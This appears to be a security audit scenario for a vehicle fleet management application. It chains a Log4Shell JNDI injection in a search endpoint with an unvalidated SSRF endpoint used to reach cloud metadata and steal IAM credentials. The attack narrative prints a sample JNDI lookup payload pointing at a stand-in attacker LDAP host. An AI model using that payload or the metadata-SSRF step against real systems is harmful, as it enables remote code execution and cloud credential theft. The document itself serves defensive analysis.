# Chained Vulnerability Scenario — Vehicle Fleet Management

## Chain: "Log4Shell → SSRF → Lateral Movement"

An external attacker triggers Log4Shell JNDI injection via a search parameter, gains code execution, and uses an unvalidated SSRF endpoint to reach cloud metadata services and steal IAM credentials.

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|----------------------|-------|----------|
| 1 | Application uses Log4j 2.14.1 and logs query inputs, making it vulnerable to JNDI injection. | Medium | A06 | `VehicleController.java` → `searchVehicles()` |
| 2 | Integration endpoint does not validate URLs before fetching them, permitting SSRF to internal/cloud metadata networks. | Medium | A10 | `IntegrationController.java` → `fetchExternalVehicleData()` |

**Attack narrative**: The attacker submits a crafted search query containing a JNDI lookup string (${jndi:ldap://attacker-controlled/exploit}) that gets logged by the vulnerable Log4j 2.14.1 library, triggering remote code execution. After gaining an initial foothold, the attacker exploits the unvalidated SSRF endpoint to send requests to internal cloud metadata services (169.254.169.254) and retrieve IAM credentials, enabling lateral movement to other cloud resources.

**Combined Impact**: Lateral movement — attacker pivots from the fleet management application to compromise cloud IAM credentials and internal infrastructure.